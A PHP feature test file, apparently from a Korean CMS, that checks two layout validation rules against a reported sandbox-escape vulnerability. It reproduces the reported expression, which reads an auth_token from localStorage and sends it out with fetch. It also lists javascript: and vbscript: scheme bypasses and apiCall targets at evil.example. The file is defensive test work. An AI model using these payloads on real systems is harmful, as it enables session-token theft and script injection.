<?php

namespace Tests\Feature\Rules;

use App\Extension\HookManager;
use App\Extension\Traits\ValidatesLayoutFiles;
use App\Rules\NoExternalUrls;
use App\Rules\SafeLayoutExpressions;
use App\Support\TrustedScriptHosts;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * 저장측 게이트 — 호스트 capability 탈출 표현식·실행 스킴 (KVE-2026-2350)
 *
 * 신고 payload 는 `content.slots.content` 의 Img error 액션에 `$event.target.ownerDocument.defaultView`
 * 로 Window 에 올라가 `localStorage.getItem('auth_token')` 을 `fetch` 로 내보내는 표현식을 담았고,
 * 두 규칙을 모두 통과해 저장됐다(PUT 200). 두 우회를 각각 막는다.
 *
 * - SafeLayoutExpressions: 호스트 그래프 토큰(ownerDocument·defaultView·fetch(·XMLHttpRequest·저장소 호출)
 * - NoExternalUrls: 실행 스킴을 트리 전체에서(top-level slots·state·computed 포함), `{{ }}` 리터럴까지
 *
 * 정상축: 번들 레이아웃 전수가 강화된 두 규칙을 그대로 통과한다(정상 외부 링크·gdpr 저장소 설정 키 포함).
 */
class LayoutHostCapabilityGateTest extends TestCase
{
    /**
     * 신고 payload 를 재현한 레이아웃 (extends + top-level slots).
     *
     * @return array<string, mixed> 레이아웃 JSON
     */
    private function reportedPayloadLayout(): array
    {
        return [
            'version' => '1.0.0',
            'layout_name' => 'admin_dashboard',
            'extends' => '_admin_base',
            'slots' => [
                'content' => [
                    [
                        'id' => 'securitytest_expression_probe',
                        'type' => 'basic',
                        'name' => 'Img',
                        'props' => ['src' => '/__missing__.png'],
                        'actions' => [
                            [
                                'type' => 'error',
                                'handler' => 'setState',
                                'params' => [
                                    'target' => 'local',
                                    'probe' => "{{\$event.target.ownerDocument.defaultView.fetch('http://127.0.0.1:8765/?t=' + \$event.target.ownerDocument.defaultView.localStorage.getItem('auth_token'))}}",
                                ],
                            ],
                        ],
                    ],
                ],
            ],
        ];
    }

    /**
     * 규칙을 실행하고 실패 메시지 목록을 돌려줍니다.
     *
     * @param  object  $rule  검증 규칙
     * @param  mixed  $value  검증 대상
     * @return array<int, string> 실패 메시지 목록
     */
    private function failures(object $rule, mixed $value): array
    {
        $messages = [];
        $rule->validate('content', $value, function (string $message) use (&$messages) {
            $messages[] = $message;
        });

        return $messages;
    }

    /**
     * 테스트 간 신뢰 호스트 훅을 정리합니다.
     *
     * @return void 반환값 없음
     */
    protected function tearDown(): void
    {
        HookManager::clearFilter(TrustedScriptHosts::FILTER_HOOK);
        parent::tearDown();
    }

    /**
     * 신고 payload 가 SafeLayoutExpressions 에서 거부되는지 검증합니다.
     *
     * @scenario case=host_graph_escape
     *
     * @effects storage_gate_rejects_host_graph_payload, sandbox_escape_blocked
     *
     * @return void 반환값 없음
     */
    public function test_reported_payload_is_rejected_by_safe_layout_expressions(): void
    {
        $this->assertNotEmpty($this->failures(new SafeLayoutExpressions, $this->reportedPayloadLayout()));
    }

    /**
     * 호스트 그래프 토큰이 어느 위치에 있든 각각 거부되는지 검증합니다.
     *
     * @effects storage_gate_rejects_host_graph_payload
     *
     * @param  string  $expression  위험 표현식
     * @return void 반환값 없음
     */
    #[DataProvider('hostGraphExpressions')]
    public function test_host_graph_tokens_are_rejected(string $expression): void
    {
        $layout = [
            'computed' => ['x' => $expression],
            'state' => ['y' => 1],
        ];

        $this->assertNotEmpty($this->failures(new SafeLayoutExpressions, $layout), $expression);
    }

    /**
     * 호스트 그래프 토큰 표현식 목록.
     *
     * @return array<string, array{0: string}> 표현식 데이터
     */
    public static function hostGraphExpressions(): array
    {
        return [
            'ownerDocument' => ['{{$event.target.ownerDocument}}'],
            'defaultView' => ['{{el.defaultView.name}}'],
            'fetch call' => ["{{w.fetch('/api/x')}}"],
            'fetch spaced' => ["{{w.fetch ('/api/x')}}"],
            'XMLHttpRequest' => ['{{new XMLHttpRequest()}}'],
            'localStorage getItem' => ["{{s.localStorage.getItem('auth_token')}}"],
            'sessionStorage setItem' => ["{{sessionStorage . setItem('a', 1)}}"],
        ];
    }

    /**
     * 정상 표현식(gdpr 저장소 설정 키·refetch 주석)이 새 토큰에 걸리지 않는지 검증합니다.
     *
     * @effects bundled_layouts_pass_strengthened_rules
     *
     * @return void 반환값 없음
     */
    public function test_storage_setting_keys_and_refetch_comment_are_not_false_positives(): void
    {
        $layout = [
            'components' => [[
                'name' => 'Div',
                'comment' => '현재 장바구니면 데이터소스 refetch (국가 변경 → 재계산)',
                'props' => [
                    'className' => "{{(settings?.necessary_storage_locked?.localStorage ?? []).length > 0 ? 'a' : 'b'}}",
                    'value' => '{{({...(_local.form ?? {}), sessionStorage: ($event?.target?.value ?? [])})}}',
                ],
            ]],
        ];

        $this->assertSame([], $this->failures(new SafeLayoutExpressions, $layout));
    }

    /**
     * 실행 스킴이 부분 순회가 모르는 키(top-level slots·state·computed·data_sources)에서도 거부되는지 검증합니다.
     *
     * @effects executable_scheme_rejected_anywhere_in_tree
     *
     * @param  array<string, mixed>  $layout  위험 레이아웃
     * @return void 반환값 없음
     */
    #[DataProvider('executableSchemeLayouts')]
    public function test_executable_scheme_is_rejected_anywhere_in_tree(array $layout): void
    {
        $this->assertNotEmpty($this->failures(new NoExternalUrls, $layout));
    }

    /**
     * 실행 스킴을 담은 레이아웃 목록.
     *
     * @return array<string, array{0: array<string, mixed>}> 레이아웃 데이터
     */
    public static function executableSchemeLayouts(): array
    {
        return [
            'top-level slots prop' => [['slots' => ['content' => [['name' => 'A', 'props' => ['href' => 'javascript:alert(1)']]]]]],
            'state value' => [['state' => ['next' => 'javascript:alert(1)']]],
            'computed value' => [['computed' => ['u' => 'vbscript:msgbox(1)']]],
            'data_sources param' => [['data_sources' => [['id' => 'x', 'endpoint' => '/api/x', 'params' => ['cb' => 'data:text/html,<script>alert(1)</script>']]]]],
            'top-level children (partial)' => [['children' => [['name' => 'A', 'props' => ['href' => 'javascript:alert(1)']]]]],
            'tab-split scheme' => [['state' => ['next' => "java\tscript:alert(1)"]]],
            'leading control char' => [['state' => ['next' => "\x01javascript:alert(1)"]]],
            'expression literal' => [['slots' => ['content' => [['name' => 'A', 'props' => ['href' => "{{ok ? '/x' : 'javascript:alert(1)'}}"]]]]]],
        ];
    }

    /**
     * 기존 sink 위치에서는 `{{ }}` 안 외부 URL 리터럴도 거부되는지 검증합니다.
     *
     * @effects executable_scheme_rejected_anywhere_in_tree
     *
     * @return void 반환값 없음
     */
    public function test_external_url_literal_inside_expression_is_rejected_at_sink(): void
    {
        $layout = ['components' => [[
            'name' => 'Img',
            'props' => ['src' => "{{cond ? 'https://evil.example/p.gif' : '/x.png'}}"],
        ]]];

        $this->assertNotEmpty($this->failures(new NoExternalUrls, $layout));
    }

    /**
     * 액션의 이동·호출 대상 외부 URL 이 부분 순회가 모르는 위치에서도 거부되는지 검증합니다.
     *
     * top-level `slots`·확장 `injections`·`itemTemplate` 등은 부분 순회 밖이라, 인증 apiCall 의 외부 대상이
     * 그대로 저장돼 관리자 브라우저가 토큰을 외부로 보냈다(권한전이). 액션은 트리 어디에 있든 실행되는 sink 다.
     *
     * @effects action_target_external_url_rejected_anywhere_in_tree
     *
     * @param  array<string, mixed>  $layout  위험 레이아웃
     * @return void 반환값 없음
     */
    #[DataProvider('externalActionTargetLayouts')]
    public function test_external_action_target_is_rejected_anywhere_in_tree(array $layout): void
    {
        $this->assertNotEmpty($this->failures(new NoExternalUrls, $layout));
    }

    /**
     * 외부 대상 액션을 부분 순회 밖 위치에 담은 레이아웃 목록.
     *
     * @return array<string, array{0: array<string, mixed>}> 레이아웃 데이터
     */
    public static function externalActionTargetLayouts(): array
    {
        $apiCall = fn (array $overrides) => array_merge(['type' => 'click', 'handler' => 'apiCall', 'auth_required' => true], $overrides);
        $button = fn (array $action) => ['type' => 'basic', 'name' => 'Button', 'actions' => [$action]];

        return [
            'top-level slots apiCall target' => [['slots' => ['content' => [$button($apiCall(['target' => 'https://evil.example/steal']))]]]],
            'top-level slots protocol-relative' => [['slots' => ['content' => [$button($apiCall(['target' => '//evil.example/steal']))]]]],
            'top-level slots expression literal' => [['slots' => ['content' => [$button($apiCall(['target' => "{{ok ? 'https://evil.example/s' : '/api/x'}}"]))]]]],
            'slots lifecycle onMount' => [['slots' => ['content' => [['name' => 'Div', 'lifecycle' => ['onMount' => [$apiCall(['target' => 'https://evil.example/s'])]]]]]]],
            'extension injections' => [['target_layout' => 'x', 'injections' => [['target_id' => 'a', 'components' => [$button($apiCall(['target' => 'https://evil.example/s']))]]]]],
            'itemTemplate' => [['components' => [['name' => 'Div', 'itemTemplate' => $button($apiCall(['target' => 'https://evil.example/s']))]]]],
            'nested onSuccess navigate params.path' => [['slots' => ['content' => [$button($apiCall(['target' => '/api/x', 'onSuccess' => [['handler' => 'navigate', 'params' => ['path' => 'https://evil.example/']]]]))]]]],
            'redirect params.url' => [['slots' => ['content' => [$button(['handler' => 'redirect', 'params' => ['url' => 'https://evil.example/']])]]]],
        ];
    }

    /**
     * 액션 대상이 아닌 위치·동일 출처 대상은 부분 순회 밖에서도 종전대로 통과하는지 검증합니다.
     *
     * @effects data_layer_external_link_still_allowed
     *
     * @return void 반환값 없음
     */
    public function test_same_origin_action_targets_and_non_target_links_still_pass_outside_sinks(): void
    {
        $layout = [
            'slots' => ['content' => [[
                'name' => 'Button',
                'props' => ['placeholder' => 'https://github.com/owner/repo'],
                'actions' => [[
                    'handler' => 'apiCall',
                    'target' => "{{'/api/admin/notification-templates/' + id}}",
                    'auth_required' => true,
                    'params' => ['method' => 'POST', 'body' => ['data' => ['action_url' => 'https://example.com/verify?token=preview']]],
                    'onSuccess' => [['handler' => 'openWindow', 'params' => ['path' => '/admin/users', 'target' => '_blank']]],
                ]],
            ]]],
        ];

        $this->assertSame([], $this->failures(new NoExternalUrls, $layout));
    }

    /**
     * 데이터 계층·안내 문구의 정상 외부 링크는 종전대로 통과하는지 검증합니다.
     *
     * @effects data_layer_external_link_still_allowed
     *
     * @return void 반환값 없음
     */
    public function test_regular_external_links_outside_sinks_still_pass(): void
    {
        $layout = [
            'state' => ['docs' => 'https://github.com/gnuboard/g7'],
            'computed' => ['help' => "{{'https://sir.kr/g7'}}"],
            'slots' => ['content' => [['name' => 'Input', 'props' => ['placeholder' => 'https://github.com/owner/repo']]]],
            'components' => [['name' => 'Img', 'props' => ['src' => '/images/a.png', 'alt' => '이미지']]],
        ];

        $this->assertSame([], $this->failures(new NoExternalUrls, $layout));
    }

    /**
     * 번들 레이아웃 전수가 강화된 두 규칙을 통과하는지(정상 회귀 없음) 검증합니다.
     *
     * @scenario case=safe_expression
     *
     * @effects bundled_layouts_pass_strengthened_rules
     *
     * @return void 반환값 없음
     */
    public function test_all_bundled_layouts_pass_strengthened_rules(): void
    {
        // 확장이 manifest 로 선언하는 신뢰 스크립트 호스트(우편번호 검색) — 테스트 DB 에는 확장 활성 이력이 없다
        HookManager::addFilter(
            TrustedScriptHosts::FILTER_HOOK,
            fn (array $hosts) => array_merge($hosts, ['t1.daumcdn.net']),
            priority: 1
        );

        $files = $this->bundledLayoutFiles();
        $this->assertGreaterThan(500, count($files), '번들 레이아웃 수집 실패');

        $violations = [];
        foreach ($files as $file) {
            $layout = json_decode((string) file_get_contents($file), true);
            if (! is_array($layout)) {
                continue;
            }

            foreach ([new SafeLayoutExpressions, new NoExternalUrls] as $rule) {
                foreach ($this->failures($rule, $layout) as $message) {
                    $violations[] = str_replace(base_path().DIRECTORY_SEPARATOR, '', $file).' ['.class_basename($rule).'] '.$message;
                }
            }
        }

        $this->assertSame([], $violations);
    }

    /**
     * 조각(partial)을 펼친 번들 화면 전수가 두 규칙을 통과하는지 검증합니다 — 편집기가 저장하는 모양 그대로다 (#727).
     *
     * 위 전수 검사는 파일을 한 장씩 읽어, 조각 파일은 `components` 밖의 컴포넌트 노드라 sink 검사를 받지 않았다.
     * 그래서 `_modal_manual_install` 입력창 안내 문구(https://github.com/…)처럼 조각 안에 든 값이 설치된 화면
     * (조각이 펼쳐진 content)에서만 걸려, 관리자 화면 5개(모듈·플러그인·템플릿·언어팩 목록, 환경설정)를 편집기로
     * 열어 그대로 저장해도 422 가 났다.
     *
     * 트러블슈팅 `[case:backend-49]` 의 회귀 그물이다.
     *
     * @effects bundled_screens_with_partials_resolved_pass_storage_gate
     *
     * @return void 반환값 없음
     */
    public function test_bundled_screens_with_partials_resolved_pass_storage_gate(): void
    {
        HookManager::addFilter(
            TrustedScriptHosts::FILTER_HOOK,
            fn (array $hosts) => array_merge($hosts, ['t1.daumcdn.net']),
            priority: 1
        );

        $loader = new class
        {
            use ValidatesLayoutFiles;

            /**
             * 설치 경로와 같은 방식으로 조각을 펼친 화면 목록을 돌려줍니다.
             *
             * @param  string  $layoutsPath  레이아웃 디렉토리
             * @param  string  $identifier  확장 식별자
             * @param  string  $sourceType  확장 종류 (template|module|plugin)
             * @return array<int, array<string, mixed>> 검증된 화면 목록
             */
            public function load(string $layoutsPath, string $identifier, string $sourceType): array
            {
                return $this->validateLayoutFiles($layoutsPath, $identifier, $sourceType, true);
            }
        };

        $sources = [];
        foreach (glob(base_path('templates/_bundled/*/layouts'), GLOB_ONLYDIR) as $dir) {
            $sources[] = [$dir, basename(dirname($dir)), 'template'];
        }
        foreach (['modules' => 'module', 'plugins' => 'plugin'] as $root => $type) {
            foreach (glob(base_path("{$root}/_bundled/*/resources/layouts"), GLOB_ONLYDIR) as $dir) {
                $sources[] = [$dir, basename(dirname($dir, 2)), $type];
            }
        }

        $screens = 0;
        $violations = [];
        foreach ($sources as [$dir, $identifier, $type]) {
            foreach ($loader->load($dir, $identifier, $type) as $layout) {
                $screens++;
                foreach ([new SafeLayoutExpressions, new NoExternalUrls] as $rule) {
                    foreach ($this->failures($rule, $layout['data']) as $message) {
                        $violations[] = "{$identifier}/{$layout['layout_name']} [".class_basename($rule).'] '.$message;
                    }
                }
            }
        }

        $this->assertGreaterThan(170, $screens, '번들 화면 수집 실패');
        $this->assertSame([], $violations);
    }

    /**
     * 번들 레이아웃·확장 JSON 파일 목록을 수집합니다.
     *
     * @return array<int, string> 절대 경로 목록
     */
    private function bundledLayoutFiles(): array
    {
        $out = [];
        foreach (['templates/_bundled', 'modules/_bundled', 'plugins/_bundled'] as $dir) {
            $iterator = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator(base_path($dir), \FilesystemIterator::SKIP_DOTS)
            );
            foreach ($iterator as $file) {
                $path = $file->getPathname();
                if (str_ends_with($path, '.json')
                    && preg_match('#[\\\\/](layouts|extensions)[\\\\/]#', $path) === 1
                    && ! preg_match('#[\\\\/](node_modules|vendor|dist|lang)[\\\\/]#', $path)) {
                    $out[] = $path;
                }
            }
        }

        return $out;
    }
}
